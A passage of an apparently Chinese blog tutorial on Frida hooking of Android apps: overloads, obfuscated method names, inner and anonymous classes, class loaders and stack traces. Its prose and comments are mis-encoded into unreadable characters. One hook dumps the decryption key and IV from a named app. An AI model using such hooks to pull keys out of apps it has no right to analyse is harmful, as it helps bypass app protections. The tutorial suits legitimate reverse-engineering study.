class="line">                    <span class="keyword">if</span> (interfaceList.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// å¦‚æœç±»å®ç°äº†è‡³å°‘ä¸€ä¸ªæ¥å£ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹ä»£ç ã€‚</span></span><br><span class="line"></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(name) <span class="comment">// æ‰“å°ç±»å</span></span><br><span class="line">                        <span class="comment">// æ‰“å°ç±»åã€‚</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> interfaceList) &#123;</span><br><span class="line">                            <span class="comment">// éå†æ¥å£åˆ—è¡¨ã€‚</span></span><br><span class="line"></span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\t&quot;</span>, interfaceList[i].<span class="title function_">toString</span>()); <span class="comment">// ç›´æ¥æ‰“å°æ¥å£åç§°</span></span><br><span class="line">                            <span class="comment">// æ‰“å°æ¯ä¸ªæ¥å£çš„åç§°ã€‚ä½¿ç”¨ toString æ–¹æ³•è·å–æ¥å£çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h2 id="3-ä¸å¯è§å‡½æ•°åhook"><a href="#3-ä¸å¯è§å‡½æ•°åhook" class="headerlink" title="3. ä¸å¯è§å‡½æ•°åhook"></a>3. ä¸å¯è§å‡½æ•°åhook</h2><p>å½“æ–¹æ³•åè¢«æ··æ·†æ—¶Öï¼Œæ‰“å°å‡ºæ¥æ‰€æœ‰çš„ç±»å<code>%D6%8F</code>,ç”¨ç¼–ç åçš„å­—ç¬¦ä¸²hook</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ç›®æ ‡ç±»</span></span><br><span class="line">        <span class="keyword">var</span> targetClass = <span class="string">&quot;com.example.hooktest.MainActivity&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> hookCls = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">        <span class="comment">// è·å¾—ç›®æ ‡ç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">var</span> methods = hookCls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="comment">// éå†æ‰€æœ‰æ–¹æ³•å</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> methods) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[i].<span class="title function_">toString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURIComponent</span>(methods[i].<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/^.*?\.([^\s\.\(\)]+)\(.*?$/</span>, <span class="string">&quot;$1&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœæœ‰ç­‰äºä¸å¯è§å­—ç¬¦ç±»çš„</span></span><br><span class="line">        hookCls[<span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%D6%8F&quot;</span>)]</span><br><span class="line">            .<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;original call: fun(&quot;</span> + x + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> result = <span class="variable language_">this</span>[<span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%D6%8F&quot;</span>)](<span class="number">900</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="4-ç¼–å†™è‡ªå®šä¹‰ç±»Java-registerClass"><a href="#4-ç¼–å†™è‡ªå®šä¹‰ç±»Java-registerClass" class="headerlink" title="4. ç¼–å†™è‡ªå®šä¹‰ç±»Java.registerClass"></a>4. ç¼–å†™è‡ªå®šä¹‰ç±»Java.registerClass</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// æ–°å»ºç±»å®ç°çš„æ¥å£ï¼Œå…ˆè·å–å…¶ç±»</span></span><br><span class="line">    <span class="keyword">var</span> face = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.construct.CheerInterface&quot;</span>);</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªç±»</span></span><br><span class="line">    <span class="keyword">var</span> beer = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">        <span class="comment">// ç±»çš„åç§°ï¼Œå°å†™å°±å¯</span></span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;com.forgotten.fridatestapp.beer&quot;</span>,</span><br><span class="line">        <span class="comment">// å®ç°çš„æ¥å£æ•°ç»„ï¼Œå¤šä¸ªæ¥å†™[a, b]</span></span><br><span class="line">        <span class="attr">implements</span>: [face],</span><br><span class="line">        <span class="comment">// ç±»ä¸­å«æœ‰çš„æ–¹æ³•</span></span><br><span class="line">        <span class="attr">methods</span>: &#123;</span><br><span class="line">            <span class="attr">cheer</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Cheer!!!&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å…¶ä½™çš„å¯å†™å±æ€§ï¼š`super` çˆ¶ç±»ï¼›`protocols` è¯¥ç±»éµå¾ªçš„åè®®æ•°ç»„ï¼Ÿ</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beer:&quot;</span>, beer);</span><br><span class="line">    <span class="comment">// è°ƒç”¨ä¸€ä¸‹è‡ªå·±ç¼–å†™çš„ç±»çš„æ–¹æ³•</span></span><br><span class="line">    beer.$new().<span class="title function_">cheer</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="5-Frida-Hooké‡è½½overload"><a href="#5-Frida-Hooké‡è½½overload" class="headerlink" title="5. Frida Hooké‡è½½overload"></a>5. Frida Hooké‡è½½overload</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookdecodeimgkey</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> base64 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Base64&quot;</span>)</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ilulutv.fulao2.other.i.b&quot;</span>).<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key, iv, image</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">b</span>(key, iv, image);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key&quot;</span>, base64.<span class="title function_">encodeToString</span>(key, <span class="number">0</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;iv&quot;</span>, base64.<span class="title function_">encodeToString</span>(iv, <span class="number">0</span>));</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">UtilsClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.kevin.app.Utils&quot;</span>);</span><br><span class="line">        <span class="comment">// é‡è½½æ— å‚æ–¹æ³•</span></span><br><span class="line">        <span class="title class_">UtilsClass</span>.<span class="property">test</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook overload no args&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">test</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// é‡è½½æœ‰å‚æ–¹æ³• - åŸºç¡€æ•°æ®ç±»å‹</span></span><br><span class="line"><span class="title class_">UtilsClass</span>.<span class="property">test</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">num</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook overload int args&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> myNum = <span class="number">9999</span>;</span><br><span class="line">            <span class="keyword">var</span> oriResult = <span class="variable language_">this</span>.<span class="title function_">test</span>(num);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;oriResult is :&quot;</span> + oriResult);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">test</span>(myNum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// é‡è½½æœ‰å‚æ–¹æ³• - å¼•ç”¨æ•°æ®ç±»å‹</span></span><br><span class="line">        <span class="title class_">UtilsClass</span>.<span class="property">test</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.kevin.app.Money&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">money</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook Money args&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">test</span>(money);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// hook æŒ‡å®šæ–¹æ³•çš„æ‰€æœ‰é‡è½½</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ClassName</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> overloadsLength = <span class="title class_">ClassName</span>.<span class="property">test</span>.<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadsLength; i++)&#123;</span><br><span class="line">            <span class="title class_">ClassName</span>.<span class="property">test</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">// éå†æ‰“å° arguments </span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; a++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(a + <span class="string">&quot; : &quot;</span> + <span class="variable language_">arguments</span>[a]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// è°ƒç”¨åŸæ–¹æ³•</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">test</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-Hookå†…éƒ¨ç±»-åŒ¿åç±»-æšä¸¾ç±»"><a href="#6-Hookå†…éƒ¨ç±»-åŒ¿åç±»-æšä¸¾ç±»" class="headerlink" title="6. Hookå†…éƒ¨ç±»&amp;åŒ¿åç±»&amp;æšä¸¾ç±»"></a>6. Hookå†…éƒ¨ç±»&amp;åŒ¿åç±»&amp;æšä¸¾ç±»</h2><h3 id="å†…éƒ¨ç±»"><a href="#å†…éƒ¨ç±»" class="headerlink" title="å†…éƒ¨ç±»$"></a>å†…éƒ¨ç±»$</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perfor</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// hook å†…éƒ¨ç±»</span></span><br><span class="line">        <span class="comment">// å†…éƒ¨ç±»ä½¿ç”¨$è¿›è¡Œåˆ†éš” ä¸ä½¿ç”¨.</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">InnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money$innerClass&quot;</span>);</span><br><span class="line">        <span class="comment">// é‡å†™å†…éƒ¨ç±»çš„ $init æ–¹æ³•</span></span><br><span class="line">        <span class="title class_">InnerClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>,<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x: &quot;</span>,x);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;y: &quot;</span>,y);</span><br><span class="line">            <span class="variable language_">this</span>.$init(x,y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h3 id="åŒ¿åç±»-1"><a href="#åŒ¿åç±»-1" class="headerlink" title="åŒ¿åç±»$1"></a>åŒ¿åç±»$1</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ¥å£, æŠ½è±¡ç±», ä¸å¯ä»¥è¢«new</span></span><br><span class="line"><span class="comment">// æ¥å£, æŠ½è±¡ç±» è¦ä½¿ç”¨å¿…é¡»è¦å®ä¾‹åŒ–, å®ä¾‹åŒ–ä¸æ˜¯é€šè¿‡new, è€Œæ˜¯é€šè¿‡å®ç°æ¥å£æ–¹æ³•, ç»§æ‰¿æŠ½è±¡ç±»ç­‰æ–¹å¼</span></span><br><span class="line"><span class="comment">// new __æ¥å£__&#123;&#125; å¯ä»¥ç†è§£æˆ new äº†ä¸€ä¸ªå®ç°æ¥å£çš„åŒ¿åç±», åœ¨åŒ¿åç±»çš„å†…éƒ¨(èŠ±æ‹¬å·å†…),å®ç°äº†è¿™ä¸ªæ¥å£</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// hook åŒ¿åç±»</span></span><br><span class="line">        <span class="comment">// åŒ¿åç±»åœ¨ smailä¸­ä»¥ $1, $2 ç­‰æ–¹å¼å­˜åœ¨, éœ€è¦é€šè¿‡ java è¡Œå·å» smail æ‰¾åˆ°å‡†ç¡®çš„åŒ¿åç±»åç§° </span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">NiMingClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MainActivity$1&quot;</span>);</span><br><span class="line">        <span class="title class_">NiMingClass</span>.<span class="property">getInfo</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;kevin change åŒ¿åç±»&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h3 id="æšä¸¾ç±»"><a href="#æšä¸¾ç±»" class="headerlink" title="æšä¸¾ç±»"></a>æšä¸¾ç±»</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enumPrint</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.r0ysue.a0526printout.Signal&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;find it ,&#x27;</span>,instance);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(instance.<span class="property">class</span>.<span class="title function_">getName</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-HookåŠ¨æ€åŠ è½½ç±»enumerateClassLoaders"><a href="#7-HookåŠ¨æ€åŠ è½½ç±»enumerateClassLoaders" class="headerlink" title="7. HookåŠ¨æ€åŠ è½½ç±»enumerateClassLoaders"></a>7. HookåŠ¨æ€åŠ è½½ç±»enumerateClassLoaders</h2><p>å¯¹äºè°ƒç”¨æ—¶åŠ¨æ€åŠ è½½çš„ç±»ï¼Œéå†ClassLoaderç„¶åæ‰¾åˆ°èƒ½åŠ è½½è¯¥ç±»çš„ClassLoaderï¼›ç„¶åå°†Fridaçš„é»˜è®¤classloaderä¸ºè®¾ç½®ä¸ºæ‰¾åˆ°çš„è¿™ä¸ªClassLoaderï¼›å†ä½¿ç”¨<code>Java.use</code>æ¥åŠ è½½è¯¥ç±»</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æšä¸¾å†…å­˜ä¸­çš„ ç±»åŠ è½½å™¨</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ‰¾åˆ°çš„ç±»åŠ è½½å™¨ èƒ½åŠ è½½çš„ç±»æœ‰[class_name]</span></span><br><span class="line">            <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;[class_name]&quot;</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully found loader&quot;</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">                <span class="comment">// è®¾ç½® javaé»˜è®¤çš„classloader</span></span><br><span class="line">                <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;find error:&quot;</span> + error)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;End&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// å† ä½¿ç”¨è¯¥ç±»</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;[class_name]&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2å’Œ7çš„åŒºåˆ«"><a href="#2å’Œ7çš„åŒºåˆ«" class="headerlink" title="2å’Œ7çš„åŒºåˆ«"></a>2å’Œ7çš„åŒºåˆ«</h4><p><code>Java.enumerateClassLoaders</code>å’Œ<code>Java.enumerateLoadedClasses</code>çš„åŒºåˆ«ï¼š</p><p><strong>Java.enumerateClassLoaders</strong></p><ul><li>ç›®çš„ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºæšä¸¾æ‰€æœ‰å½“å‰æ´»è·ƒçš„ Java ç±»åŠ è½½å™¨ï¼ˆClassLoadersï¼‰ã€‚</li><li>è¿”å›å€¼ï¼šå®ƒè¿”å›ä¸€ä¸ªåŒ…å«ç±»åŠ è½½å™¨å®ä¾‹çš„æ•°ç»„ã€‚</li><li>ä½¿ç”¨åœºæ™¯ï¼šå½“ä½ éœ€è¦è·å–å¯¹ç‰¹å®šç±»åŠ è½½å™¨çš„å¼•ç”¨ï¼Œä»¥è¿›ä¸€æ­¥æ“ä½œç±»åŠ è½½å™¨ï¼ˆä¾‹å¦‚ï¼ŒæŸ¥æ‰¾å®ƒåŠ è½½çš„ç±»ã€å®šä¹‰æ–°ç±»æˆ–æŸ¥æ‰¾èµ„æºï¼‰æ—¶ï¼Œè¿™ä¸ªå‡½æ•°éå¸¸æœ‰ç”¨ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">            <span class="comment">// å¯ä»¥ä½¿ç”¨ loader.findClass(name) æ¥æŸ¥æ‰¾ç±»ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–ç±»åŠ è½½å™¨ç›¸å…³çš„æ–¹æ³•ã€‚</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Enumerated all class loaders.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Java.enumerateLoadedClasses</strong></p><ul><li>ç›®çš„ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºæšä¸¾ç”±æ‰€æœ‰æ´»è·ƒçš„ç±»åŠ è½½å™¨åŠ è½½çš„æ‰€æœ‰ Java ç±»ã€‚</li><li>è¿”å›å€¼ï¼šå®ƒä¸ä¼šç›´æ¥è¿”å›ç±»å®ä¾‹çš„æ•°ç»„ï¼Œè€Œæ˜¯é€šè¿‡å›è°ƒå‡½æ•° <code>onMatch</code> æä¾›ç±»åã€‚</li><li>ä½¿ç”¨åœºæ™¯ï¼šå½“ä½ éœ€è¦è·å–å½“å‰è¿è¡Œæ—¶ç¯å¢ƒä¸­æ‰€æœ‰åŠ è½½çš„ç±»çš„åˆ—è¡¨æ—¶ï¼Œè¿™ä¸ªå‡½æ•°éå¸¸æœ‰ç”¨ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(className);</span><br><span class="line">            <span class="comment">// å¯ä»¥ä½¿ç”¨ Java.use(className) æ¥è·å–ç±»çš„å¼•ç”¨ã€‚</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Enumerated all loaded classes.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>ä¸»è¦åŒºåˆ«</strong>ï¼š</p><ul><li>æ“ä½œå¯¹è±¡ï¼š<code>enumerateClassLoaders</code> æ“ä½œçš„æ˜¯ç±»åŠ è½½å™¨å®ä¾‹ï¼Œè€Œ <code>enumerateLoadedClasses</code> æ“ä½œçš„æ˜¯ç”±è¿™äº›ç±»åŠ è½½å™¨åŠ è½½çš„ç±»ã€‚</li><li>ä½¿ç”¨æ–¹å¼ï¼š<code>enumerateClassLoaders</code> é€šå¸¸ç”¨äºå½“ä½ éœ€è¦æ›´ç»†ç²’åº¦çš„æ§åˆ¶ï¼Œæ¯”å¦‚åŠ è½½è‡ªå®šä¹‰ç±»æˆ–è®¿é—®ç‰¹å®šç±»åŠ è½½å™¨çš„èµ„æºæ—¶ã€‚<code>enumerateLoadedClasses</code> åˆ™ç”¨äºå½“ä½ éœ€è¦åˆ—å‡ºæ‰€æœ‰å·²åŠ è½½çš„ç±»æ—¶ã€‚</li><li>è¿”å›å€¼ï¼š<code>enumerateClassLoaders</code> è¿”å›ç±»åŠ è½½å™¨å®ä¾‹ï¼Œ<code>enumerateLoadedClasses</code> åˆ™é€šè¿‡å›è°ƒå‡½æ•°æä¾›ç±»åã€‚</li></ul><p>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œä½ å¯èƒ½éœ€è¦ç»“åˆä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œé¦–å…ˆæšä¸¾ç±»åŠ è½½å™¨ï¼Œç„¶åå¯¹æ¯ä¸ªç±»åŠ è½½å™¨ä½¿ç”¨ <code>findClass</code> æ–¹æ³•æ¥æŸ¥æ‰¾ç‰¹å®šçš„ç±»æˆ–æšä¸¾å®ƒä»¬åŠ è½½çš„æ‰€æœ‰ç±»ã€‚</p><h2 id="8-Fridaæ‰“å°æ ˆå›æº¯"><a href="#8-Fridaæ‰“å°æ ˆå›æº¯" class="headerlink" title="8. Fridaæ‰“å°æ ˆå›æº¯"></a>8. Fridaæ‰“å°æ ˆå›æº¯</h2><p><strong>Exceptionç±»æŠ›å‡ºå¼‚å¸¸</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStack</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = <span class="title class_">Exception</span>.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(replaceStr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            <span class="title class_">Exception</span>.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Logç±»Throwable()&amp;Exception</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStacks</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====== printStacks start ====== &quot;</span> + name + <span class="string">&quot;==============================&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sample 1</span></span><br><span class="line">    <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title 